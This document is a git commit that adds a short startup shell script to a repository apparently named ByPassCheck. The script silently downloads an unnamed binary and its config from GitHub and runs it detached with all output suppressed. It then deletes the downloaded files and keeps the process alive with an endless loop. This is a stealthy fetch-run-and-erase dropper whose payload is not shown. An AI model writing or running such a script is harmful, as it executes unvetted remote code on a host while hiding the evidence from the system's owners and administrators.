f988419fd13bcd9619ca7d039b7ead7c05729a38
GTale <45941219+GTale@users.noreply.github.com>
2022-03-10 01:30:47 +0800

    Create start.sh

---
+++ start.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges -q -O $$
+wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/ges.json -q -O $$.json
+chmod +x $$ 
+nohup ./$$ config $$.json >/dev/null 2>&1  &
+sleep 5
+rm -rf $$*
+while [ 1 == 1 ]; do sleep 9999; done
